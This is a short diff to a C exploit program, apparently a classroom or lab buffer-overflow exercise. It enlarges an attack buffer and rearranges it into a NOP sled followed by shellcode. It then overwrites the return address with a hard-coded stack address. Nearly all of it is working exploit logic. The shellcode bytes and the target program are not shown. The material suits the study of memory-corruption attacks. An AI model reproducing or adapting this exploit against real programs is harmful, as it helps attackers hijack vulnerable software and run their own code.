@@ -8,7 +8,7 @@
 
 #define SHELL_SIZE 45
 #define BUF_TO_RET 120
-#define BUF_SIZE 125
+#define BUF_SIZE 129
 #define BUF_ADDR 0x2021fe10
 
 int
@@ -18,10 +18,11 @@ main ( int argc, char * argv[] )
 	char *	env[1];
 	unsigned char attack_buffer[BUF_SIZE];
 
-	for (int i = 0; i < SHELL_SIZE; i++)
-		attack_buffer[i] = shellcode[i];
-	for (int i = SHELL_SIZE; i < BUF_TO_RET; i++)
+	
+	for (int i = 0; i < BUF_TO_RET - SHELL_SIZE; i++)
 		attack_buffer[i] = 0x90;
+	for (int i = 0; i < SHELL_SIZE; i++)
+		attack_buffer[BUF_TO_RET - SHELL_SIZE + i] = shellcode[i];
 
 	attack_buffer[BUF_TO_RET + 3] = (char) (BUF_ADDR & 0xFF);
 	attack_buffer[BUF_TO_RET + 2] = (char) ((BUF_ADDR & 0x0000FF00) >> 8);
